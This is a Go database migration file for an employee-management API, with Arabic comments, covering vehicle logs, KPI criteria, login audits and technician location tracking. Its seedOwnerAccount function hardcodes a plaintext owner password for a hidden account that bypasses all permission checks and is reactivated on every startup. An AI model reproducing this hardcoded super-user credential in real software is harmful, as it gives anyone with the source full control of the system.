package database

import (
	"github.com/jmoiron/sqlx"
	"golang.org/x/crypto/bcrypt"

	"staffmange-api/internal/model"
)

// migrations هي تعديلات بسيطة وآمنة على البنية (ADD COLUMN IF NOT EXISTS فقط) تُطبَّق
// تلقائياً كل مرة يشتغل فيها السيرفر، حتى ما يحتاج أي شخص يشغّل ملفات SQL يدوياً بعد
// سحب تحديث جديد — بس git pull وتشغيل السيرفر كافي.
var migrations = []string{
	`ALTER TABLE "Customer" ADD COLUMN IF NOT EXISTS "mapLatitude" DOUBLE PRECISION`,
	`ALTER TABLE "Customer" ADD COLUMN IF NOT EXISTS "mapLongitude" DOUBLE PRECISION`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "isTrainee" BOOLEAN NOT NULL DEFAULT false`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "shiftStart" TEXT`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "shiftEnd" TEXT`,

	// وقت تجهيز المواد (يحدده تيم ليدر الفريق) ومدة استجابة الفنيين بعده لحد ما يبدون
	// الشغل فعلياً — حتى نعرف مين ضيّع وقت بدل ما يتحرك مباشرة.
	`ALTER TABLE "Booking" ADD COLUMN IF NOT EXISTS "materialsReadyAt" TIMESTAMP`,
	`ALTER TABLE "Booking" ADD COLUMN IF NOT EXISTS "materialsReadyById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,
	`ALTER TABLE "Booking" ADD COLUMN IF NOT EXISTS "responseMinutes" INTEGER`,

	// جدول متابعة المركبات: وقود، تنظيف، تبديل زيت — سجل واحد لكل حدث، مع موعد الاستحقاق
	// الجاي (nextDueAt) حتى نقدر نبني جدول مواعيد متكرر من فوقه.
	`CREATE TABLE IF NOT EXISTS "VehicleLog" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		type TEXT NOT NULL,
		"performedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"nextDueAt" TIMESTAMP,
		odometer INTEGER,
		cost DOUBLE PRECISION,
		notes TEXT,
		"recordedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleLog_vehicleId_idx" ON "VehicleLog"("vehicleId")`,

	// أعطال وأضرار (صدمات) لكل سيارة، مع تحديد المسبب والتكلفة وحالة المعالجة.
	`CREATE TABLE IF NOT EXISTS "VehicleIncident" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		type TEXT NOT NULL,
		description TEXT NOT NULL,
		"responsibleEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		cost DOUBLE PRECISION,
		status TEXT NOT NULL DEFAULT 'OPEN',
		"reportedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"resolvedAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "VehicleIncident_vehicleId_idx" ON "VehicleIncident"("vehicleId")`,

	// تقرير حالة شهري لكل سيارة (فيها مشكلة هذا الشهر؟ انعالجت لو لا؟)
	`CREATE TABLE IF NOT EXISTS "VehicleMonthlyStatus" (
		id TEXT PRIMARY KEY,
		"vehicleId" TEXT NOT NULL REFERENCES "Vehicle"(id) ON DELETE CASCADE,
		month TEXT NOT NULL,
		"hasIssue" BOOLEAN NOT NULL DEFAULT false,
		"issueDescription" TEXT,
		resolved BOOLEAN NOT NULL DEFAULT false,
		notes TEXT,
		"recordedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("vehicleId", month)
	)`,

	// جرد الأدوات اليومي: الفني يؤكد جرد عدته الخاصة قبل ما يطلع للحجز، والإداري يشوف
	// نتائج كل الفنيين بيوم واحد حتى يوفر البديل بحال اكو نقص.
	`CREATE TABLE IF NOT EXISTS "InventoryCheck" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		complete BOOLEAN NOT NULL,
		"missingItems" TEXT,
		"checkedAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "InventoryCheck_employeeId_idx" ON "InventoryCheck"("employeeId")`,
	`CREATE INDEX IF NOT EXISTS "InventoryCheck_checkedAt_idx" ON "InventoryCheck"("checkedAt")`,

	// وحدة الجودة: مشاكل تنفيذية ميدانية + مشاكل رقابية/إدارية، مع تحديد المسؤول.
	`CREATE TABLE IF NOT EXISTS "QualityIssue" (
		id TEXT PRIMARY KEY,
		category TEXT NOT NULL,
		title TEXT NOT NULL,
		description TEXT,
		"responsibleEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"reportedById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"bookingId" TEXT REFERENCES "Booking"(id) ON DELETE SET NULL,
		status TEXT NOT NULL DEFAULT 'OPEN',
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		"resolvedAt" TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "QualityIssue_status_idx" ON "QualityIssue"(status)`,

	// دور GPS_ENGINEER اتلغى — تركيب GPS صار مهارة عادية (مثل باقي الخدمات) يمنحها
	// الأدمن لأي فني عادي بدل ما يكون دور مستقل. "أبو الجي بي اس" (GPS_ADMIN) هو
	// الدور الوحيد الخاص بـGPS اللي بقى، ويرتب موعد الزبون لطلبات GPS الجديدة.
	`ALTER TABLE "GpsDeviceRequest" ADD COLUMN IF NOT EXISTS "scheduledAt" TIMESTAMP`,
	`ALTER TABLE "GpsDeviceRequest" ADD COLUMN IF NOT EXISTS "assignedTechnicianId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,

	// طلبات الكادر: مدير المشاريع يطلب موظفين محددين من كادر الشد بوقت ومدة محددة،
	// والطلب يروح لإدارة الكوادر (HR) حتى تلبيه — هو الأعلى صلاحية عليهم.
	`CREATE TABLE IF NOT EXISTS "StaffRequest" (
		id TEXT PRIMARY KEY,
		"requesterId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"projectId" TEXT REFERENCES "Project"(id) ON DELETE SET NULL,
		"neededAt" TIMESTAMP NOT NULL,
		"durationHours" DOUBLE PRECISION NOT NULL DEFAULT 8,
		notes TEXT,
		status TEXT NOT NULL DEFAULT 'PENDING',
		"handledById" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"handledAt" TIMESTAMP,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE TABLE IF NOT EXISTS "StaffRequestEmployee" (
		id TEXT PRIMARY KEY,
		"requestId" TEXT NOT NULL REFERENCES "StaffRequest"(id) ON DELETE CASCADE,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		UNIQUE ("requestId", "employeeId")
	)`,
	`CREATE INDEX IF NOT EXISTS "StaffRequest_status_idx" ON "StaffRequest"(status)`,
	`CREATE INDEX IF NOT EXISTS "StaffRequest_requesterId_idx" ON "StaffRequest"("requesterId")`,

	// ربط المشروع بالحجز الأصلي: الحجوزات الكبيرة اللي يحولها إداري الكوادر لإدارة
	// المشاريع تنشأ منها مشاريع، وهذا العمود يمنع عرض نفس الحجز مرتين كمقترح مشروع.
	`ALTER TABLE "Project" ADD COLUMN IF NOT EXISTS "bookingId" TEXT REFERENCES "Booking"(id) ON DELETE SET NULL`,

	// دور "مهندس" (ENGINEER) الجديد — يشترط أربع مهارات هندسية أساسية قبل ما ينعطى
	// له الدور (تصميم/تخطيط/تنفيذ/إشراف)، التحقق نفسه بمنطق Go لأنه شرط عمل مو بنية جدول.
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'ENGINEER'`,
	// دور "المالك" (OWNER) — حساب واحد فقط، أقوى من ADMIN، يتخطى كل قيود
	// الأدوار والصلاحيات (middleware.RequireRole/RequirePermission).
	`ALTER TYPE "EmployeeRole" ADD VALUE IF NOT EXISTS 'OWNER'`,
	// حالتين جديدتين للموظف: أرشفة (قابلة للاسترجاع) وحذف (سجل ناعم) — الاثنين
	// يختفون من كل واجهات النظام العادية، الأدمن/المالك بس يشوف تاريخهم.
	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'ARCHIVED'`,
	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'DELETED'`,
	// حماية من التلاعب بجلسة تسجيل الدخول من أدوات المطورين بالمتصفح: لو حساب
	// عادي حاول يوصل لعملية أو مسار مو مسموحله بيه (بعد تعديل بيانات الجلسة
	// بالمتصفح مثلاً)، الباك إند يرفضه دائماً (الدور الحقيقي من التوكن الموقّع
	// وليس من أي شي يرسله المتصفح) ويسجل "محاولة اختراق" — إذا تكررت 3 مرات
	// نوقف الحساب تلقائياً (status = SUSPENDED) ويصير ميكدر يستخدم النظام
	// حتى لو رجع يسجل دخول بكلمة سره الصحيحة.
	`ALTER TYPE "EmployeeStatus" ADD VALUE IF NOT EXISTS 'SUSPENDED'`,
	`ALTER TABLE "Employee" ADD COLUMN IF NOT EXISTS "authzViolations" INT NOT NULL DEFAULT 0`,

	// سجل تدقيق تسجيل الدخول: كل محاولة دخول (ناجحة أو فاشلة) تنسجل هنا مع
	// عنوان IP والمتصفح/الجهاز — أساس لوحة المراقبة الأمنية الخلفية.
	// ملاحظة: المتصفح لا يقدر تقنياً يكشف عنوان MAC الفعلي لأي جهاز (قيد أمان
	// بكل المتصفحات الحديثة)، فالتتبع يعتمد على IP + بصمة المتصفح/الجهاز.
	`CREATE TABLE IF NOT EXISTS "LoginAudit" (
		id TEXT PRIMARY KEY,
		username TEXT NOT NULL,
		"employeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		success BOOLEAN NOT NULL,
		"ipAddress" TEXT,
		"userAgent" TEXT,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "LoginAudit_employeeId_idx" ON "LoginAudit"("employeeId", "createdAt")`,
	`CREATE INDEX IF NOT EXISTS "LoginAudit_createdAt_idx" ON "LoginAudit"("createdAt")`,

	// نوع الشكوى (قائمة منسدلة ثابتة بدل وصف حر) + الموظف المتسبب (اختياري)
	`ALTER TABLE "Complaint" ADD COLUMN IF NOT EXISTS "type" TEXT NOT NULL DEFAULT 'OTHER'`,
	`ALTER TABLE "Complaint" ADD COLUMN IF NOT EXISTS "relatedEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,

	// إرجاع نقطة كي بي اي: ما نحذفها نهائياً — نعلّمها "ملغاة" حتى يضل تاريخها
	// موجود ويشوفه المراقب، بس تأثيرها المالي (deductionAmount) يوقف يحسب.
	`ALTER TABLE "KpiEvaluation" ADD COLUMN IF NOT EXISTS cancelled BOOLEAN NOT NULL DEFAULT false`,
	`ALTER TABLE "KpiEvaluation" ADD COLUMN IF NOT EXISTS "cancelledAt" TIMESTAMP`,
	`ALTER TABLE "KpiEvaluation" ADD COLUMN IF NOT EXISTS "cancelledByEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL`,

	// نقاط الكي بي اي صارت قابلة للإضافة والحذف من الواجهة (صلاحية منفصلة)
	// بدل ما تكون مثبتة بالكود.
	`CREATE TABLE IF NOT EXISTS "KpiCriterion" (
		id TEXT PRIMARY KEY,
		label TEXT NOT NULL UNIQUE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,

	// "مسؤول خدمة" عام: تعميم فكرة أبو الجي بي اس لأي مجموعة خدمات — جدول يربط موظف
	// بمجموعة خدمات هو المسؤول الوحيد عن تفعيلها/جدولتها (مثال: GPS + صوتيات + حريق سوا).
	`CREATE TABLE IF NOT EXISTS "ServiceManager" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"serviceId" TEXT NOT NULL REFERENCES "Service"(id) ON DELETE CASCADE,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
		UNIQUE ("employeeId", "serviceId")
	)`,
	`CREATE INDEX IF NOT EXISTS "ServiceManager_employeeId_idx" ON "ServiceManager"("employeeId")`,
	`CREATE INDEX IF NOT EXISTS "ServiceManager_serviceId_idx" ON "ServiceManager"("serviceId")`,

	// تتبع موقع الفني الحي وهو ماشي للزبون — يلتقط المتصفح موقعه دورياً أثناء فتح
	// الصفحة، ونخزن آخر نقطة + سجل المسار (لعرضه على الخريطة بمتابعة الفرق الميدانية).
	`CREATE TABLE IF NOT EXISTS "LocationPing" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"bookingId" TEXT REFERENCES "Booking"(id) ON DELETE SET NULL,
		latitude DOUBLE PRECISION NOT NULL,
		longitude DOUBLE PRECISION NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "LocationPing_employeeId_idx" ON "LocationPing"("employeeId", "createdAt")`,

	// تقييم الأداء (منفصل تماماً عن KPI مال الغرامات المالية) — يحدد هل الموظف يستحق
	// تدريب أو لا. التيم ليدر يقيّم فنييه، والإداري يقيّم التيم ليدر نفسه.
	`CREATE TABLE IF NOT EXISTS "PerformanceReview" (
		id TEXT PRIMARY KEY,
		"employeeId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		"evaluatorId" TEXT NOT NULL REFERENCES "Employee"(id) ON DELETE CASCADE,
		rating TEXT NOT NULL,
		reason TEXT NOT NULL,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE INDEX IF NOT EXISTS "PerformanceReview_employeeId_idx" ON "PerformanceReview"("employeeId")`,

	// متابعة الجودة: كل حجز يكتمل (COMPLETED) ينشئ سطر هنا تلقائياً حتى مهندس الجودة
	// يتواصل مع الزبون ويتأكد ما اكو مشاكل. "status" يتحول من PENDING إلى CONTACTED_OK
	// أو CONTACTED_ISSUE بعد التواصل، أو CONVERTED إذا حوّلها المهندس لحجز جديد.
	`CREATE TABLE IF NOT EXISTS "QualityFollowUp" (
		id TEXT PRIMARY KEY,
		"bookingId" TEXT NOT NULL REFERENCES "Booking"(id) ON DELETE CASCADE,
		"customerId" TEXT NOT NULL REFERENCES "Customer"(id) ON DELETE CASCADE,
		status TEXT NOT NULL DEFAULT 'PENDING',
		"contactNotes" TEXT,
		"contactedByEmployeeId" TEXT REFERENCES "Employee"(id) ON DELETE SET NULL,
		"contactedAt" TIMESTAMP,
		"createdAt" TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
	)`,
	`CREATE UNIQUE INDEX IF NOT EXISTS "QualityFollowUp_bookingId_key" ON "QualityFollowUp"("bookingId")`,
	`CREATE INDEX IF NOT EXISTS "QualityFollowUp_status_idx" ON "QualityFollowUp"(status)`,
}

func Migrate(db *sqlx.DB) error {
	for _, stmt := range migrations {
		if _, err := db.Exec(stmt); err != nil {
			return err
		}
	}
	if err := migrateGpsEngineersToSkill(db); err != nil {
		return err
	}
	if err := seedEngineeringSkills(db); err != nil {
		return err
	}
	if err := seedOwnerAccount(db); err != nil {
		return err
	}
	return seedKpiCriteria(db)
}

// seedKpiCriteria يزرع نقاط الكي بي اي الثمانية الأصلية مرة وحدة (idempotent) —
// بعدها تصير قابلة للإضافة والحذف من واجهة إدارة النقاط (صلاحية منفصلة).
func seedKpiCriteria(db *sqlx.DB) error {
	criteria := []string{
		"العلاقة مع الزملاء",
		"تنفيذ المهام الموكلة إليه",
		"استطيع ولا استطيع",
		"الالتزام بالآليات وتوجيهات المسؤول",
		"تنظيف السيارة",
		"سرعة الاستجابة بالمهام",
		"ترتيب العدد",
		"شكوى الزبائن",
	}
	for _, label := range criteria {
		if _, err := db.Exec(`
			INSERT INTO "KpiCriterion" (id, label)
			VALUES (gen_random_uuid()::text, $1)
			ON CONFLICT (label) DO NOTHING
		`, label); err != nil {
			return err
		}
	}
	return nil
}

// seedOwnerAccount يزرع حساب مالك النظام مرة وحدة (idempotent — upsert بالـ username)،
// حساب واحد فوق كل شي حتى فوق ADMIN (يشوف كل شي بما فيه لوحة المراقبة الخلفية
// الحصرية)، ما يطلع بأي قائمة موظفين عادية، ومحد يقدر يمنح هذا الدور لغيره من
// الواجهة (مقفول بـ employee_service.go).
func seedOwnerAccount(db *sqlx.DB) error {
	const username = "q.7si_"
	const password = "X994ddopvsa"
	hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return err
	}
	_, err = db.Exec(`
		INSERT INTO "Employee" (id, name, username, password, role, status, "jobTitle")
		VALUES ('owner_root', 'المالك', $1, $2, 'OWNER', 'ACTIVE', 'مالك النظام')
		ON CONFLICT (id) DO UPDATE SET username = $1, role = 'OWNER', status = 'ACTIVE'
	`, username, string(hashed))
	return err
}

// seedEngineeringSkills يزرع خدمة "الهندسة" ومهاراتها الأربع مرة وحدة (idempotent) —
// نفس هالمهارات تنشرط بالموظف قبل ما يوصل دور "مهندس".
func seedEngineeringSkills(db *sqlx.DB) error {
	if _, err := db.Exec(`
		INSERT INTO "Service" (id, name, category)
		VALUES ('svc_engineering', 'الهندسة', 'إدارية')
		ON CONFLICT (id) DO NOTHING
	`); err != nil {
		return err
	}
	for _, name := range model.EngineeringSkillNames {
		if _, err := db.Exec(`
			INSERT INTO "Skill" (id, name, "serviceId")
			VALUES ('sk_eng_' || $1, $1, 'svc_engineering')
			ON CONFLICT (id) DO NOTHING
		`, name); err != nil {
			return err
		}
	}
	return nil
}

// migrateGpsEngineersToSkill يحول أي موظف لسه بدور GPS_ENGINEER (القديم) إلى TECHNICIAN
// عادي، ويمنحه كل مهارات تركيب GPS تلقائياً حتى يضل يقدر يستلم نفس شغله بالضبط.
func migrateGpsEngineersToSkill(db *sqlx.DB) error {
	var ids []string
	if err := db.Select(&ids, `SELECT id FROM "Employee" WHERE role = 'GPS_ENGINEER'`); err != nil {
		return err
	}
	if len(ids) == 0 {
		return nil
	}

	var gpsSkillIDs []string
	if err := db.Select(&gpsSkillIDs, `
		SELECT sk.id FROM "Skill" sk JOIN "Service" sv ON sv.id = sk."serviceId" WHERE sv.name = 'GPS'
	`); err != nil {
		return err
	}

	for _, empID := range ids {
		if _, err := db.Exec(`UPDATE "Employee" SET role = 'TECHNICIAN' WHERE id = $1`, empID); err != nil {
			return err
		}
		for _, skillID := range gpsSkillIDs {
			if _, err := db.Exec(`
				INSERT INTO "EmployeeSkill" (id, "employeeId", "skillId", "canPerform")
				VALUES (gen_random_uuid()::text, $1, $2, true)
				ON CONFLICT ("employeeId", "skillId") DO UPDATE SET "canPerform" = true
			`, empID, skillID); err != nil {
				return err
			}
		}
	}
	return nil
}
